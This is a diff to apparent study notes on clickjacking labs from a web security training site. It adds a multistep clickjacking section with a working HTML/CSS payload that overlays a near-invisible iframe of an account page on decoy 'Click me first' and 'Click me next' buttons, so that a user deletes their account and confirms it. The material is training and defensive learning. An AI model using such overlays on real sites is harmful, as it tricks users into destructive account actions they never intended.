@@ -38,7 +38,8 @@ we have to make a decoy website aligning the delete key exactly for the ```click
 <iframe src="https://0af700940419171583d50a790095008e.web-security-academy.net/my-account"></iframe>
 ```
 
-i)  made the <div> element of decoy element and the target site of same size so they both get alligned perfectly.
+i)  made the `<div>` element of decoy element and the target site of same size so they both get alligned perfectly.
+
 ii) then changed the position of the text "click" to the match the decoy site's delete account position.
 
 
@@ -153,3 +154,48 @@ load the name parameter with the xss payload and other parameters also and make 
 ```
 
 ## Multistep Clickjacking
+
+guiding the user to perform more than one task like in prev cases the user is only clicking submit to submit a form. but attacker can make
+the user to perform more than one click as the ```iframe``` creates a whole frame of another site which acts like a normal site for
+submitting forms.
+
+attacker can use multiples divisions in exploit to perform the attack.
+
+### LAB-5
+
+construct an attack that fools the user into clicking the delete account button and the confirmation dialog box that comes after clicking
+the delete account.
+
+we can add two div elements one for ```delete account - Click me first``` and other for ```confirm - Click me next```.
+
+**payload** 
+```
+<style>
+    iframe {
+        position:absolute;
+        width:1000px;
+        height: 1000px;
+        opacity:0.1;
+        z-index: 2;
+    }
+#first-div {
+        position:absolute;
+        top:520px;
+        left:60px;
+        z-index: 1;
+    }
+#second-div {
+        position:absolute;
+        top:310px;
+        left:200px;
+        z-index: 1;
+    }
+</style>
+<div id="first-div">Click me first</div>
+<div id="second-div">Click me next</div>
+<iframe src="https://0a55002c0322ebfb806544ca00680060.web-security-academy.net/my-account" ></iframe>
+```
+
+## Prevention techniques
+
+### X-Frame-Options
